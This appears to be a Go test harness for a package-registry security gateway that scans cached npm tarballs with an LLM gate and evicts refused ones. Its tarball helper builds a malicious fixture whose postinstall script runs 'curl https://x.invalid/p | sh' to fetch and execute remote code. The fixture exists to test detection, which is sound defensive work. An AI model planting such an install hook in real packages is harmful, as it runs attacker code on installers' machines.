package fullscan

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log/slog"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/blechschmidt/pullthrough-security/internal/audit"
	"github.com/blechschmidt/pullthrough-security/internal/cache"
	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan"
	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
	"github.com/blechschmidt/pullthrough-security/internal/scan/commit"
)

// The harness: a cache of npm tarballs with fill metadata, and a Scanner that
// puts an object before the real LLM package-scan gate (internal/llmpkgscan)
// driven by the mock LLM (pkgscantest.Provider), and applies the action ladder
// the way the gateway does — a refused verdict under block or quarantine evicts
// the object from the cache.

type fakeObject struct {
	data []byte
	meta map[string]string
	mod  time.Time
}

type fakeCache struct {
	mu   sync.Mutex
	objs map[string]*fakeObject
	fail error
}

func newFakeCache() *fakeCache { return &fakeCache{objs: map[string]*fakeObject{}} }

// put caches an object filled by a request for path of upstream as tenant.
func (c *fakeCache) put(key, upstream, path, tenant string, data []byte, mod time.Time) {
	c.mu.Lock()
	defer c.mu.Unlock()
	meta := map[string]string{cache.MetaDigest: pkgscantest.Digest(data)}
	if upstream != "" {
		meta[cache.MetaFillUpstream] = upstream
		meta[cache.MetaFillPath] = path
	}
	if tenant != "" {
		meta[cache.MetaFillTenant] = tenant
	}
	c.objs[key] = &fakeObject{data: data, meta: meta, mod: mod}
}

func (c *fakeCache) has(key string) bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	_, ok := c.objs[key]
	return ok
}

func (c *fakeCache) del(key string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	delete(c.objs, key)
}

func (c *fakeCache) get(key string) (*fakeObject, bool) {
	c.mu.Lock()
	defer c.mu.Unlock()
	o, ok := c.objs[key]
	return o, ok
}

func (c *fakeCache) Entries(context.Context) ([]cache.Stat, error) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.fail != nil {
		return nil, c.fail
	}
	out := make([]cache.Stat, 0, len(c.objs))
	for k, o := range c.objs {
		meta := map[string]string{}
		for mk, mv := range o.meta {
			meta[mk] = mv
		}
		out = append(out, cache.Stat{Key: k, Size: int64(len(o.data)), ModTime: o.mod, Metadata: meta})
	}
	return out, nil
}

// gateScanner is the Scanner: the real gate with the mock LLM.
type gateScanner struct {
	svc   *llmpkgscan.Service
	cache *fakeCache

	mu    sync.Mutex
	order []string // keys, in the order scans started
	gate  chan struct{}
}

func (g *gateScanner) Signature() string { return g.svc.Signature().String() }

func (g *gateScanner) Load() (int64, int64, int) { return g.svc.Load() }

func (g *gateScanner) started() []string {
	g.mu.Lock()
	defer g.mu.Unlock()
	return append([]string(nil), g.order...)
}

func (g *gateScanner) Scan(ctx context.Context, a Artifact, opts ScanOptions) (Reading, error) {
	g.mu.Lock()
	g.order = append(g.order, a.Key)
	gate := g.gate
	g.mu.Unlock()
	if gate != nil {
		select {
		case <-gate:
		case <-ctx.Done():
			return Reading{}, ctx.Err()
		}
	}
	o, ok := g.cache.get(a.Key)
	if !ok {
		return Reading{}, ErrGone
	}
	name := strings.TrimPrefix(a.Path, "/")
	name, _, _ = strings.Cut(name, "/")
	rep, err := g.svc.Assess(ctx, llmpkgscan.Request{
		Artifact: llmpkgscan.Artifact{
			Ecosystem: "npm", Upstream: a.Upstream, Name: name, Version: "1.0.0",
			Filename: name + "-1.0.0.tgz", Digest: o.meta[cache.MetaDigest], Size: int64(len(o.data)),
			Class: llmpkgscan.ClassPayload,
		},
		Tenant:  a.Tenant,
		Open:    func(context.Context) (io.ReadCloser, error) { return io.NopCloser(bytes.NewReader(o.data)), nil },
		Refresh: opts.Refresh,
	})
	if err != nil {
		return Reading{}, err
	}
	if rep == nil {
		return Reading{Kind: ReadingNotApplicable, Code: "not-package-content"}, nil
	}
	d := g.svc.Decide(rep)
	r := Reading{Digest: o.meta[cache.MetaDigest], Size: int64(len(o.data)), Cost: rep.SpentUSD, Action: d.Action,
		Ecosystem: rep.Artifact.Ecosystem, Name: rep.Artifact.Name, Version: rep.Artifact.Version}
	if v := rep.Verdict; v != nil {
		r.Kind, r.Disposition, r.Fresh = ReadingVerdict, string(rep.Disposition), !rep.Cached
		r.Signature, r.VerdictKey = llmpkgscan.SignatureOf(v).String(), v.Key
	} else {
		u := rep.Unscanned
		r.Kind, r.Code, r.Content = ReadingUnscanned, u.Code, u.Content
		r.Retryable = u.Transient || u.Code == llmpkgscan.CodeBudgetExhausted || u.Code == llmpkgscan.CodeProviderUnavailable
	}
	if !d.Served() {
		r.Refused = true
		if d.Evict {
			g.cache.del(a.Key)
			r.Evicted = true
		}
	}
	return r, nil
}

// costPerScan is what one mock completion costs (bundle mode: one per scan).
const costPerScan = 1.0

func newGate(t *testing.T, model string, store llmpkgscan.VerdictStore, provider *pkgscantest.Provider, action llmpkgscan.Action) *llmpkgscan.Service {
	t.Helper()
	pricing := commit.DefaultPricing().WithOverrides(map[string]commit.ModelPrice{
		// The mock reports 128 input tokens per completion: $1 a scan.
		model: {InputPerMTok: costPerScan * 1e6 / 128},
	})
	svc, err := llmpkgscan.NewService(llmpkgscan.Config{
		Enabled: true, Provider: provider, Model: model, Mode: llmpkgscan.ModeBundle,
		Action: action, Store: store, Pricing: pricing, MaxConcurrent: 4,
		Logger: slog.New(slog.NewTextHandler(io.Discard, nil)),
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = svc.Close() })
	return svc
}

// recAudit records audit events.
type recAudit struct {
	mu  sync.Mutex
	evs []audit.Event
}

func (r *recAudit) Log(_ context.Context, ev audit.Event) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.evs = append(r.evs, ev)
	return nil
}

func (r *recAudit) actions() []string {
	r.mu.Lock()
	defer r.mu.Unlock()
	var out []string
	for _, ev := range r.evs {
		if a, ok := ev.Detail["action"].(string); ok && ev.Type == audit.EventFullScan {
			out = append(out, a)
		}
	}
	return out
}

// clock is a settable clock.
type clock struct {
	mu sync.Mutex
	t  time.Time
}

func (c *clock) now() time.Time {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.t
}

func (c *clock) add(d time.Duration) {
	c.mu.Lock()
	c.t = c.t.Add(d)
	c.mu.Unlock()
}

func testOptions(dir string, ups ...string) Options {
	if len(ups) == 0 {
		ups = []string{"npm"}
	}
	return Options{
		Dir: dir, Upstreams: ups, Tenant: "mirror", Concurrency: 1, DailyUSD: 1000,
		Logger:    slog.New(slog.NewTextHandler(io.Discard, nil)),
		RetryBase: time.Millisecond, BusyWait: 5 * time.Millisecond, ControlRefresh: time.Millisecond,
		PersistInterval: time.Millisecond, StandbyInterval: 10 * time.Millisecond, InboxInterval: time.Millisecond,
		TenantInterval:  time.Millisecond,
		PublishInterval: time.Millisecond,
	}
}

func startService(t *testing.T, opts Options, sc Scanner, inv Inventory) *Service {
	t.Helper()
	s, err := New(opts)
	if err != nil {
		t.Fatal(err)
	}
	s.Attach(sc, inv)
	s.Start(context.Background())
	t.Cleanup(func() { _ = s.Close() })
	return s
}

func waitFor(t *testing.T, what string, cond func() bool) {
	t.Helper()
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if cond() {
			return
		}
		time.Sleep(5 * time.Millisecond)
	}
	t.Fatalf("timed out waiting for %s", what)
}

func upstreamStatus(t *testing.T, s *Service, name string) UpstreamStatus {
	t.Helper()
	s.mu.Lock()
	s.statusCache = nil
	s.mu.Unlock()
	u, err := s.UpstreamStatus(name)
	if err != nil {
		t.Fatal(err)
	}
	return u
}

// tarball is a benign npm tarball, or a malicious one carrying the mock's
// marker in its install script.
func tarball(name string, malicious bool) []byte {
	scripts := map[string]string{"test": "node test.js"}
	extra := map[string]string{"index.js": "module.exports = function () { return " + fmt.Sprintf("%q", name) + " }\n"}
	if malicious {
		scripts["postinstall"] = "node install.js"
		extra["install.js"] = "require('child_process').exec('curl https://x.invalid/p | sh') // " + pkgscantest.MaliciousMarker + "\n"
	}
	return pkgscantest.NpmTarball(name, "1.0.0", scripts, extra)
}

func objectKey(name string) string { return "npm:" + name + "/-/" + name + "-1.0.0.tgz" }

func objectPath(name string) string { return "/" + name + "/-/" + name + "-1.0.0.tgz" }
